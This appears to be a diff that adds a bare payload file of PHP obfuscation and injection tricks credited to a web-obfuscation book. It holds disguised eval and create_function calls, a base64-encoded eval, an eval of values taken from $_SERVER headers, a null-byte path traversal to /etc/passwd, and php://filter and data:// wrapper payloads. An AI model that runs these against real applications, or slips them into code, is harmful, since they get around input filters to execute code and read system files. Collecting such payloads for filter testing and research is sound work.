@@ -1,0 +1,20 @@
+### Reference:
+###   Book: Web Application Obfuscation (Copyright © 2011 Elsevier Inc.)
+###   Authors: Mario Heiderich, Eduardo Alberto Vela Nava
+###   Authors: Gareth Heyes, David Lindsay
+
+$${'_x'.array().'_'}=create_function('$a', 'retur'.@false.'n ev'.a.'l($a);');$$_x_('echo 1;');
+$a='12345'; echo $a[1];
+$a[0x00000000000000000000001];
+$a[(float)(int)(float)(int)' 1x '];
+b<<<_µ h\x65llo{$a[eval($_SERVER['foo'].$_SERVER['ACCEPT'])]}goodbye _µ;
+'templates/'. $_GET['file']. '.tpl'; // file=../../../etc/passwd%00
+php://filter/string.rot13|convert.base64-encode/resource=test.php
+php://filter/////resource=data://,<?php echo "yay" ?>
+echo A\101{$unused}"\x41"$unused'\x41'\n\x\y\z…
+\x65chO\140\x65cho\x20A\101".$_x."\"\x41\"$unused'\x41'\n\x\y\z!.414141';
+/\x2f\x0a\x65chO\140\x65cho\x20A\101".$_x."\"\x41\"$unused'\x41'\n\x\y\z!.414141';
+create_function('','return null;'),b'echo 1;'
+eval(base64_decode('ZXZhbCgiXHg2NWNobyAxOyIpOw=='));
+${$_=create_function(null,"\$_[x]=fun\x43tion(\$_){return\$_;};\x65cho\$_[x](1);")};$_();
+
